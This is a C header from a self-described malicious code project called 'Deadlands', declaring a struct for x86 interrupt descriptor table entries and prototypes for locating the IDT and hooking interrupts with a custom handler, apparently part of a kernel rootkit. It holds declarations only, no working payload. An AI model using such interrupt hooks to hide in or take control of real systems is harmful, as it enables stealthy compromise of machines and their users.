/*
** hookIDT.h for ** MALICIOUS CODE: PROJECT - DEADLANDS **
** 
** Made by majdi
** Login   <majdi.toumi@gmail.com>
** 
*/

#ifndef __HOOK_IDT_H__
# define __HOOK_IDT_H__

/*
** ~ Defines:
*/
# define ERROR_CODE	""
# define INT_0		0x0

/*
** ~ Type definition:
*/
#pragma pack(1)
struct			s_descriptorIDT
{
  unsigned short	offset_lo;
  unsigned short	seg_selector;
  unsigned char		reserved;
  unsigned char		flag;
  unsigned short	offset_hi;
};

/*
** ~ Function prototypes:
*/
unsigned long	get_idt_addr(void);
int		epiHook(int nINT, void *new_interrupt);
int		epiHook1(int nINT);
void		*get_interrupt_from_idt(int nINT);
asmlinkage void my_handler(struct pt_regs * regs, long err_code);

#endif /* !__HOOK_IDT_H__ */
